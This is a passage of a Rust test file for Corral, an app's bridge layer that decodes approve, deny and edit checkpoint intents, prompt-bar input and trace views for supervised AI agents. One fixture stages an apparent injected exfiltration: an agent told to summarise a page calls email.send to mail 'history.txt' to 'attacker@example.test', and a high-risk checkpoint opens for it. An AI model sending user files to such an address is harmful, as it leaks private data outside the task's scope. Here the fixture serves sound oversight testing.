            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"once","how":"touchId"}}"#,
            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"once","how":"voice"}}"#,
            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"forever","how":"click"}}"#,
            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","how":"click"}}"#,
            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"","scope":"once","how":"click"}}"#,
            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp\u0007","scope":"once","how":"click"}}"#,
            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"","checkpoint":"cp-1","scope":"once","how":"click"}}"#,
            r#"{"v":1,"intent":{"kind":"approveCheckpoint","id":"scout","checkpoint":"cp-1","scope":"once","how":"click","args":{}}}"#,
            r#"{"v":1,"intent":{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1","note":"ok","scope":"once"}}"#,
            long_note.as_str(),
        ];
        for b in bad {
            assert!(
                decode_intent(b.as_bytes()).is_err(),
                "{}",
                &b[..b.len().min(160)]
            );
        }
        assert!(matches!(
            decode_intent(long_note.as_bytes()),
            Err(BridgeError::NoteTooLong(n)) if n == MAX_NOTE_BYTES + 1
        ));
        let fits = "n".repeat(MAX_NOTE_BYTES);
        let at_cap = format!(
            r#"{{"v":1,"intent":{{"kind":"denyCheckpoint","id":"scout","checkpoint":"cp-1","note":"{fits}"}}}}"#
        );
        assert!(
            decode_intent(at_cap.as_bytes()).is_ok(),
            "a note of exactly {MAX_NOTE_BYTES} bytes is fine"
        );
    }
}

#[cfg(test)]
mod edit_tests {
    use super::*;
    use corral_core::corral_view::{AgentCard, DropView};
    use corral_core::domain::{ActionClass, Risk};
    use corral_core::event::*;
    use corral_core::ids::{CheckpointId, RunId, SessionId, SpanId, ToolCallId};
    use corral_core::run_card::{EDIT_MAX_FIELDS, RunCards};
    use corral_policy::Approval;
    use serde_json::{Value, json};
    use std::collections::BTreeMap;

    const ROSTER: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-edit-v1.json");
    const EDIT: &str = include_str!(
        "../../../../native/CorralNative/Fixtures/bridge/intent-edit-checkpoint-v1.json"
    );

    fn ev(ts: u64, body: EventBody) -> Event {
        Event {
            run_id: RunId::from("r1"),
            seq: 1,
            ts,
            span_id: SpanId::from("span"),
            parent_span_id: None,
            body,
        }
    }

    fn edit(changes: Value, how: &str) -> Vec<u8> {
        json!({"v": 1, "intent": {
            "kind": "editCheckpoint", "id": "scout", "checkpoint": "cp-1",
            "changes": changes, "how": how,
        }})
        .to_string()
        .into_bytes()
    }

    #[test]
    fn tp_chk_15_a_waiting_calls_fields_ride_on_the_card_as_the_fixture_shows() {
        let mut cards = RunCards::default();
        let args = json!({
            "attachments": ["history.txt"],
            "body": "the history",
            "retries": 3,
            "to": "attacker@example.test",
        });
        let events = [
            ev(
                0,
                EventBody::RunQueued(RunQueued {
                    agent_id: AgentId::from("scout"),
                    session_id: SessionId::from("s1"),
                    prompt: "Summarize the attached page.".into(),
                }),
            ),
            ev(
                1_000,
                EventBody::RunStarted(RunStarted {
                    adapter: "fake".into(),
                }),
            ),
            ev(
                1_500,
                EventBody::ToolRequested(ToolRequested {
                    tool_call_id: ToolCallId::from("call-1"),
                    tool: "email.send".into(),
                    action_class: ActionClass::CommsSend,
                    args: args.clone(),
                }),
            ),
            ev(
                2_000,
                EventBody::CheckpointOpened(CheckpointOpened {
                    checkpoint_id: CheckpointId::from("cp-1"),
                    tool_call_id: ToolCallId::from("call-1"),
                    action_class: ActionClass::CommsSend,
                    risk: Risk::High,
                    title: "Sending a message or email".into(),
                    detail: format!("email.send to attacker@example.test\n{args}"),
                }),
            ),
        ];
        for e in &events {
            cards.observe(e).expect("legal");
        }
        let view = CorralView {
            drops: vec![DropView {
                agent: AgentCard {
                    id: AgentId::from("scout"),
                    name: "Scout".into(),
                    monogram: "Sc".into(),
                },
                state: DropState::NeedsYou,
            }],
            hidden: 0,
        };
        let sent = RosterSnapshot::with_cards(&view, &cards, 5_000)
            .to_bytes()
            .expect("encode");
        let sent: Value = serde_json::from_slice(&sent).expect("json");
        let want: Value = serde_json::from_str(ROSTER).expect("fixture");
        assert_eq!(sent, want);
    }

    #[test]
    fn tp_chk_15_an_edit_from_a_card_arrives_typed() {
        let changes: BTreeMap<String, String> = [("retries", "1"), ("to", "me@example.test")]
            .into_iter()
            .map(|(k, v)| (k.to_owned(), v.to_owned()))
            .collect();
        assert_eq!(
            decode_intent(EDIT.as_bytes()).expect("edit"),
            Intent::EditCheckpoint {
                agent: AgentId::from("scout"),
                checkpoint: CheckpointId::from("cp-1"),
                changes: changes.clone(),
                how: Approval::Click,
            }
        );
        assert_eq!(
            decode_intent(&edit(
                json!({"retries": "1", "to": "me@example.test"}),
                "keyboard"
            ))
            .expect("edit"),
            Intent::EditCheckpoint {
                agent: AgentId::from("scout"),
                checkpoint: CheckpointId::from("cp-1"),
                changes,
                how: Approval::Keyboard,
            }
        );
    }

    #[test]
    fn tp_chk_15_a_card_never_edits_with_touch_id_or_voice() {
        for how in ["touchId", "voice", "Click"] {
            assert!(
                matches!(
                    decode_intent(&edit(json!({"to": "me@example.test"}), how)),
                    Err(BridgeError::Malformed(_))
                ),
                "{how}"
            );
        }
    }

    #[test]
    fn tp_chk_15_edits_are_bounded() {
        let many: serde_json::Map<String, Value> = (0..=EDIT_MAX_FIELDS)
            .map(|i| (format!("k{i:02}"), json!("v")))
            .collect();
        assert!(matches!(
            decode_intent(&edit(Value::Object(many), "click")),
            Err(BridgeError::BadEdit)
        ));
        let fits: serde_json::Map<String, Value> = (0..EDIT_MAX_FIELDS)
            .map(|i| (format!("k{i:02}"), json!("v")))
            .collect();
        assert!(decode_intent(&edit(Value::Object(fits), "click")).is_ok());
        assert!(matches!(
            decode_intent(&edit(json!({}), "click")),
            Err(BridgeError::BadEdit)
        ));
        // A key no field can have: over 40 characters of 4 bytes each.
        let long = "k".repeat(161);
        assert!(matches!(
            decode_intent(&edit(json!({ long: "v" }), "click")),
            Err(BridgeError::BadEdit)
        ));
        let at_cap = "k".repeat(160);
        assert!(decode_intent(&edit(json!({ at_cap: "v" }), "click")).is_ok());
        // Values are text, never JSON: the core decides what they become.
        assert!(matches!(
            decode_intent(&edit(json!({"retries": 1}), "click")),
            Err(BridgeError::Malformed(_))
        ));
        assert!(matches!(
            decode_intent(&edit(json!(["to"]), "click")),
            Err(BridgeError::Malformed(_))
        ));
        assert_eq!(
            BridgeError::BadEdit.to_string(),
            "an edit must change 1 to 20 fields, each with a key of at most 160 bytes"
        );
    }

    #[test]
    fn tp_chk_15_an_edit_needs_valid_ids() {
        let bad = json!({"v": 1, "intent": {
            "kind": "editCheckpoint", "id": "", "checkpoint": "cp-1",
            "changes": {"to": "me@example.test"}, "how": "click",
        }});
        assert!(matches!(
            decode_intent(bad.to_string().as_bytes()),
            Err(BridgeError::BadId)
        ));
        let bad = json!({"v": 1, "intent": {
            "kind": "editCheckpoint", "id": "scout", "checkpoint": "cp\n1",
            "changes": {"to": "me@example.test"}, "how": "click",
        }});
        assert!(matches!(
            decode_intent(bad.to_string().as_bytes()),
            Err(BridgeError::BadId)
        ));
    }
}

#[cfg(test)]
mod touch_id_tests {
    use super::*;
    use serde_json::json;

    const TOUCH_ID: &str = include_str!(
        "../../../../native/CorralNative/Fixtures/bridge/intent-approve-touch-id-v1.json"
    );

    #[test]
    fn tp_chk_18_approve_with_touch_id_arrives_typed_as_the_fixture_shows() {
        assert_eq!(
            decode_intent(TOUCH_ID.as_bytes()).expect("intent"),
            Intent::ApproveWithTouchId {
                agent: AgentId::from("scout"),
                checkpoint: CheckpointId::from("cp-1"),
            }
        );
    }

    #[test]
    fn tp_chk_18_approve_with_touch_id_needs_valid_ids_and_nothing_else() {
        for intent in [
            json!({"kind": "approveWithTouchId", "id": "", "checkpoint": "cp-1"}),
            json!({"kind": "approveWithTouchId", "id": "scout", "checkpoint": "cp\n1"}),
        ] {
            let bytes = json!({"v": 1, "intent": intent}).to_string();
            assert!(
                matches!(decode_intent(bytes.as_bytes()), Err(BridgeError::BadId)),
                "{bytes}"
            );
        }
        // The card asks; it can't say how it went. Only Swift's prompt reports that.
        let bytes = json!({"v": 1, "intent": {
            "kind": "approveWithTouchId", "id": "scout", "checkpoint": "cp-1", "outcome": "ok",
        }})
        .to_string();
        assert!(matches!(
            decode_intent(bytes.as_bytes()),
            Err(BridgeError::Malformed(_))
        ));
    }
}

#[cfg(test)]
mod corral_idle_tests {
    use super::*;

    const IDLE: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-corral-idle-v1.json");

    #[test]
    fn tp_usage_10_swift_reports_when_the_corral_is_idle() {
        assert_eq!(
            decode_intent(IDLE.as_bytes()).expect("corralIdle"),
            Intent::CorralIdle(true)
        );
        assert_eq!(
            decode_intent(br#"{"v":1,"intent":{"kind":"corralIdle","idle":false}}"#).expect("busy"),
            Intent::CorralIdle(false)
        );
    }

    #[test]
    fn tp_usage_10_a_malformed_report_is_refused() {
        for bad in [
            r#"{"v":1,"intent":{"kind":"corralIdle"}}"#,
            r#"{"v":1,"intent":{"kind":"corralIdle","idle":"yes"}}"#,
            r#"{"v":1,"intent":{"kind":"corralIdle","idle":true,"id":"grok"}}"#,
        ] {
            assert!(decode_intent(bad.as_bytes()).is_err(), "{bad}");
        }
    }
}

#[cfg(test)]
mod prompt_bar_tests {
    use super::*;
    use corral_core::prompt_bar::{BarAgent, BarStatus, How, view};
    use serde_json::Value;

    const EDITED: &str = include_str!(
        "../../../../native/CorralNative/Fixtures/bridge/intent-prompt-bar-edited-v1.json"
    );
    const SEND: &str = include_str!(
        "../../../../native/CorralNative/Fixtures/bridge/intent-prompt-bar-send-v1.json"
    );
    const BAR: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/prompt-bar-v1.json");
    const NOTE: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/prompt-bar-note-v1.json");

    fn json(bytes: &[u8]) -> Value {
        serde_json::from_slice(bytes).expect("json")
    }

    fn agents() -> Vec<BarAgent> {
        [
            ("grok", "Grok", BarStatus::Working),
            ("claude", "Claude", BarStatus::Ready),
        ]
        .into_iter()
        .map(|(id, name, status)| BarAgent {
            agent: corral_core::mention::Addressee {
                id: AgentId::from(id),
                name: name.to_owned(),
                shown: true,
            },
            status,
        })
        .collect()
    }

    fn intent(body: &str) -> Result<Intent, BridgeError> {
        decode_intent(format!(r#"{{"v":1,"intent":{body}}}"#).as_bytes())
    }

    #[test]
    fn tp_bar_08_an_edit_and_a_send_arrive_typed_as_the_fixtures_show() {
        assert_eq!(
            decode_intent(EDITED.as_bytes()).expect("edited"),
            Intent::PromptBarEdited(BarEdit {
                seq: 7,
                text: "@cl plan the trip".to_owned(),
                cursor: 3,
                selection: vec![AgentId::from("grok")],
            })
        );
        assert_eq!(
            decode_intent(SEND.as_bytes()).expect("send"),
            Intent::PromptBarSend {
                edit: BarEdit {
                    seq: 8,
                    text: "@claude @grok plan the trip".to_owned(),
                    cursor: 27,
                    selection: vec![],
                },
                how: How::Return,
            }
        );
        let all = intent(
            r#"{"kind":"promptBarSend","seq":9,"text":"go","selection":["grok","grok"],"all":true}"#,
        );
        let Ok(Intent::PromptBarSend { edit, how }) = all else {
            panic!("send: {all:?}");
        };
        assert_eq!(
            (how, edit.selection),
            (How::All, vec![AgentId::from("grok")]),
            "deduped"
        );
    }

    #[test]
    fn tp_bar_08_the_cursor_is_kept_inside_the_text_on_a_character() {
        let at = |text: &str, cursor: u64| {
            let body = format!(
                r#"{{"kind":"promptBarEdited","seq":1,"text":{},"cursor":{cursor},"selection":[]}}"#,
                serde_json::to_string(text).expect("text")
            );
            let Ok(Intent::PromptBarEdited(edit)) = intent(&body) else {
                panic!("edited");
            };
            edit.cursor
        };
        assert_eq!(at("@cl", 99), 3, "past the end");
        assert_eq!(at("@é", 2), 1, "inside a character: back to its start");
        assert_eq!(at("@é", 3), 3);
        assert_eq!(at("", u64::MAX), 0);
    }

    #[test]
    fn tp_bar_08_bad_edits_and_sends_are_refused() {
        let long = "x".repeat(MAX_PROMPT_BYTES + 1);
        let nine: Vec<String> = (0..9).map(|i| format!("\"a{i}\"")).collect();
        for bad in [
            format!(
                r#"{{"kind":"promptBarEdited","seq":1,"text":"{long}","cursor":0,"selection":[]}}"#
            ),
            format!(
                r#"{{"kind":"promptBarSend","seq":1,"text":"{long}","selection":[],"all":false}}"#
            ),
            format!(
                r#"{{"kind":"promptBarEdited","seq":1,"text":"go","cursor":0,"selection":[{}]}}"#,
                nine.join(",")
            ),
            r#"{"kind":"promptBarEdited","seq":1,"text":"go","cursor":0,"selection":[""]}"#
                .to_owned(),
            r#"{"kind":"promptBarEdited","seq":1,"text":"go","cursor":-1,"selection":[]}"#
                .to_owned(),
            r#"{"kind":"promptBarEdited","seq":1,"text":"go","selection":[]}"#.to_owned(),
            r#"{"kind":"promptBarSend","seq":1,"text":"go","selection":[]}"#.to_owned(),
            r#"{"kind":"promptBarSend","seq":1,"text":"go","selection":[],"all":false,"cursor":2}"#
                .to_owned(),
        ] {
            assert!(intent(&bad).is_err(), "{}", &bad[..bad.len().min(120)]);
        }
    }

    #[test]
    fn tp_bar_08_the_bars_view_goes_to_swift_as_the_fixtures_show() {
        let shown = PromptBarSnapshot::new(
            7,
            view(
                "@cl plan the trip",
                "@cl",
                &[AgentId::from("grok")],
                &agents(),
            ),
            None,
        );
        assert_eq!(
            json(&shown.to_bytes().expect("bytes")),
            json(BAR.as_bytes())
        );
        let noted = PromptBarSnapshot::new(
            8,
            view("", "", &[], &agents()),
            Some(BarOutcome::Note("Sent to Claude. Grok is busy.".to_owned())),
        );
        assert_eq!(
            json(&noted.to_bytes().expect("bytes")),
            json(NOTE.as_bytes())
        );
        let sent = PromptBarSnapshot::new(9, view("", "", &[], &agents()), Some(BarOutcome::Sent));
        assert_eq!(
            json(&sent.to_bytes().expect("bytes"))["outcome"],
            serde_json::json!({"kind": "sent"})
        );
        let refused = PromptBarSnapshot::new(
            9,
            view("go", "go", &[], &agents()),
            Some(BarOutcome::Refused("Grok is busy.".to_owned())),
        );
        assert_eq!(
            json(&refused.to_bytes().expect("bytes"))["outcome"],
            serde_json::json!({"kind": "refused", "text": "Grok is busy."})
        );
    }

    #[test]
    fn tp_bar_08_a_full_length_text_and_eight_selected_drops_are_taken() {
        let full = "x".repeat(MAX_PROMPT_BYTES);
        let eight: Vec<String> = (0..MAX_SHOWN).map(|i| format!("\"a{i}\"")).collect();
        let body = format!(
            r#"{{"kind":"promptBarSend","seq":1,"text":"{full}","selection":[{}],"all":false}}"#,
            eight.join(",")
        );
        let Ok(Intent::PromptBarSend { edit, .. }) = intent(&body) else {
            panic!("refused");
        };
        assert_eq!(
            (edit.text.len(), edit.selection.len()),
            (MAX_PROMPT_BYTES, MAX_SHOWN)
        );
    }
}

#[cfg(test)]
mod prompt_bar_logo_tests {
    use super::*;
    use corral_core::mention::Addressee;
    use corral_core::prompt_bar::{BarAgent, BarStatus, view};
    use serde_json::Value;

    const LOGOS: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/prompt-bar-logos-v1.json");
    const CLAUDE_LOGO: &str = "/Users/you/Library/Application Support/Corral/logos/anthropic.png";

    fn agents() -> Vec<BarAgent> {
        [
            ("grok", "Grok", BarStatus::Working),
            ("claude", "Claude", BarStatus::Ready),
        ]
        .into_iter()
        .map(|(id, name, status)| BarAgent {
            agent: Addressee {
                id: AgentId::from(id),
                name: name.to_owned(),
                shown: true,
            },
            status,
        })
        .collect()
    }

    fn json(bytes: &[u8]) -> Value {
        serde_json::from_slice(bytes).expect("json")
    }

    #[test]
    fn tp_bar_10_each_suggestion_carries_its_agents_logo_as_the_fixture_swift_decodes() {
        let answer = PromptBarSnapshot::new(
            7,
            view(
                "@cl plan the trip",
                "@cl",
                &[AgentId::from("grok")],
                &agents(),
            ),
            None,
        )
        .with_logos(|id| (id.as_str() == "claude").then(|| CLAUDE_LOGO.to_owned()));
        assert_eq!(
            json(&answer.to_bytes().expect("bytes")),
            json(LOGOS.as_bytes())
        );
    }

    #[test]
    fn tp_bar_10_a_suggestion_without_a_logo_has_no_logo_key() {
        let answer =
            PromptBarSnapshot::new(7, view("@", "@", &[], &agents()), None).with_logos(|_| None);
        let sent = json(&answer.to_bytes().expect("bytes"));
        let rows = sent["view"]["suggestions"].as_array().expect("rows");
        assert_eq!(rows.len(), 2);
        for row in rows {
            assert!(row.get("logo").is_none(), "{row}");
        }
    }
}

#[cfg(test)]
mod trace_wire_tests {
    use super::*;
    use corral_core::corral_view::{AgentCard, DropView};
    use corral_core::event::{
        Event, EventBody, PlanStep, PlanUpdated, RunQueued, RunStarted, StepStatus,
    };
    use corral_core::ids::{RunId, SessionId, SpanId};
    use corral_core::trace_tree::trace_tree;
    use serde_json::Value;

    const PLAN: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-plan-v1.json");
    const TRACE: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-trace-v1.json");

    fn ev(ts: u64, body: EventBody) -> Event {
        Event {
            run_id: RunId::from("r1"),
            seq: ts,
            ts,
            span_id: SpanId::from("s"),
            parent_span_id: None,
            body,
        }
    }

    /// Claude working on "Tidy my notes", on the 2nd of 5 planned steps (with `plan`).
    fn cards(plan: bool) -> RunCards {
        let mut cards = RunCards::default();
        let mut events = vec![
            ev(
                0,
                EventBody::RunQueued(RunQueued {
                    agent_id: AgentId::from("claude"),
                    session_id: SessionId::from("s1"),
                    prompt: "Tidy my notes".into(),
                }),
            ),
            ev(
                1_000,
                EventBody::RunStarted(RunStarted {
                    adapter: "fake".into(),
                }),
            ),
        ];
        if plan {
            events.push(ev(
                1_500,
                EventBody::PlanUpdated(PlanUpdated {
                    steps: ["Read", "Group", "Summarize", "Email", "File"]
                        .iter()
                        .enumerate()
                        .map(|(i, title)| PlanStep {
                            title: (*title).into(),
                            status: match i {
                                0 => StepStatus::Done,
                                1 => StepStatus::InProgress,
                                _ => StepStatus::Pending,
                            },
                        })
                        .collect(),
                }),
            ));
        }
        for e in &events {
            cards.observe(e).expect("legal");
        }
        cards
    }

    fn view() -> CorralView {
        CorralView {
            drops: vec![DropView {
                agent: AgentCard {
                    id: AgentId::from("claude"),
                    name: "Claude".into(),
                    monogram: "Cl".into(),
                },
                state: DropState::Working,
            }],
            hidden: 0,
        }
    }

    fn json(snapshot: &RosterSnapshot) -> Value {
        serde_json::from_slice(&snapshot.to_bytes().expect("encode")).expect("json")
    }

    #[test]
    fn tp_hover_03_each_card_carries_its_plan_as_the_fixture_swift_decodes() {
        let cards = cards(true);
        let sent = RosterSnapshot::with_cards(&view(), &cards, 4_000).with_plans(&cards);
        assert_eq!(
            json(&sent),
            serde_json::from_str::<Value>(PLAN).expect("fixture")
        );
    }

    #[test]
    fn tp_hover_03_a_card_without_subtasks_has_no_plan_key() {
        let none = cards(false);
        let sent = json(&RosterSnapshot::with_cards(&view(), &none, 4_000).with_plans(&none));
        assert!(sent["cards"][0].get("plan").is_none(), "{sent}");
        let unplanned = json(&RosterSnapshot::with_cards(&view(), &cards(true), 4_000));
        assert!(
            unplanned["cards"][0].get("plan").is_none(),
            "only with_plans adds it"
        );
    }

    #[test]
    fn tp_trace_02_the_roster_carries_the_trace_tree_as_the_fixture_swift_decodes() {
        let cards = cards(true);
        let tree = trace_tree(&cards, &[AgentId::from("claude")]);
        let sent = RosterSnapshot::from(&view()).with_trace(&tree);
        assert_eq!(
            json(&sent),
            serde_json::from_str::<Value>(TRACE).expect("fixture")
        );
    }

    #[test]
    fn tp_trace_06_with_nothing_running_the_roster_has_no_trace() {
        let tree = trace_tree(&RunCards::default(), &[AgentId::from("claude")]);
        let sent = json(&RosterSnapshot::from(&view()).with_trace(&tree));
        assert!(sent.get("trace").is_none(), "{sent}");
    }
}

#[cfg(test)]
mod trace_names_tests {
    use super::*;
    use corral_core::trace_tree::{TraceColumn, TraceTree};

    fn tree(ids: &[&str]) -> TraceTree {
        TraceTree {
            columns: ids
                .iter()
                .map(|id| TraceColumn {
                    agent: AgentId::from(*id),
                    status: CardStatus::Working,
                    prompt: corral_core::agent_text::AgentText::new("Tidy my notes", 280),
                    subtask: None,
                    next: Vec::new(),
                })
                .collect(),
            more: 0,
        }
    }

    fn columns(snapshot: &RosterSnapshot) -> Vec<serde_json::Value> {
        let sent: serde_json::Value =
            serde_json::from_slice(&snapshot.to_bytes().expect("encode")).expect("json");
        sent["trace"]["columns"]
            .as_array()
            .cloned()
            .unwrap_or_default()
    }

    #[test]
    fn tp_trace_02_each_column_carries_its_agents_name_and_logo_shown_or_hidden() {
        let view = CorralView {
            drops: Vec::new(),
            hidden: 2,
        };
        let sent = RosterSnapshot::from(&view)
            .with_trace(&tree(&["muse", "gpt"]))
            .with_column_names(|id| (id.as_str() == "muse").then(|| "Muse Spark".to_owned()))
            .with_logos(|id| (id.as_str() == "muse").then(|| "/x/logos/muse.png".to_owned()));
        let columns = columns(&sent);
        assert_eq!(columns[0]["name"], "Muse Spark");
        assert_eq!(columns[0]["logo"], "/x/logos/muse.png");
        assert!(columns[1].get("name").is_none() && columns[1].get("logo").is_none());
    }

    #[test]
    fn tp_trace_02_names_and_logos_without_a_trace_change_nothing() {
        let view = CorralView {
            drops: Vec::new(),
            hidden: 0,
        };
        let sent = RosterSnapshot::from(&view)
            .with_column_names(|_| Some("X".to_owned()))
            .with_logos(|_| Some("/x/logos/x.png".to_owned()));
        assert!(columns(&sent).is_empty());
    }
}

#[cfg(test)]
mod open_trace_tests {
    use super::*;

    const OPEN: &str =
        include_str!("../../../../native/CorralNative/Fixtures/bridge/intent-open-trace-v1.json");

    #[test]
    fn tp_trace_05_a_task_card_click_arrives_as_the_fixture_shows() {
        assert_eq!(
            decode_intent(OPEN.as_bytes()).expect("open"),
            Intent::OpenTrace(AgentId::from("claude"))
        );
        for bad in [
            r#"{"v":1,"intent":{"kind":"openTrace","id":""}}"#,
            r#"{"v":1,"intent":{"kind":"openTrace","id":"has space"}}"#,
            r#"{"v":1,"intent":{"kind":"openTrace"}}"#,
            r#"{"v":1,"intent":{"kind":"openTrace","id":"claude","run":"r1"}}"#,
        ] {
            assert!(decode_intent(bad.as_bytes()).is_err(), "{bad}");
        }
    }
}
